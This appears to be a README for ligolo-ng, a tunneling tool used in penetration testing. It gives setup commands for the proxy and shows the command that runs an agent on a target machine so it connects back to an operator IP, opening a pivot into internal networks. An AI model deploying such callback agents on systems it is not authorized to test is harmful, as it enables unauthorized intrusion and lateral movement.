# ligolo-ng

[ligolo-ng](https://github.com/nicocha30/ligolo-ng) is an advanced, yet simple tunneling tool that uses a TUN interface. It lets you pivot into internal networks by creating a tunnel from the agent (on the target) to the proxy (on the attacker/operator machine) using a simple TCP/TLS connection.

## Architecture

```
[Operator Machine] ---(TLS)--- [Target / Agent]
  ligolo-ng proxy                ligolo-ng agent
  (TUN interface)                (pivot point)
```

Traffic routed through the TUN interface on the operator machine reaches the internal network via the agent.

## Quick Start

### Docker (proxy side)

```bash
docker compose up -d
```

### Binary Download

```bash
# Releases: https://github.com/nicocha30/ligolo-ng/releases
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_linux_amd64.tar.gz
tar xzf ligolo-ng_proxy_linux_amd64.tar.gz
tar xzf ligolo-ng_agent_linux_amd64.tar.gz
```

## Usage

### 1. Start the proxy (operator machine)

```bash
# Create TUN interface
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# Start proxy (listens for agent connections on port 11601)
./proxy -selfcert -laddr 0.0.0.0:11601
```

### 2. Connect the agent (target machine)

```bash
./agent -connect <operator-ip>:11601 -ignore-cert
```

### 3. Start tunnel in the proxy shell

```
ligolo-ng » session
[Select your session]
ligolo-ng » start
```

### 4. Add route to internal network

```bash
sudo ip route add 192.168.1.0/24 dev ligolo
```

## Examples

| File | Description |
|------|-------------|
| `examples/proxy-setup.md` | Detailed proxy setup on the operator side |
| `examples/agent-setup.md` | Agent deployment on target machine |
| `examples/port-redirect.md` | Redirect ports via listener |
| `examples/multi-pivot.md` | Multi-hop pivoting setup |

## References

- [ligolo-ng GitHub](https://github.com/nicocha30/ligolo-ng)
- [ligolo-ng Wiki](https://github.com/nicocha30/ligolo-ng/wiki)
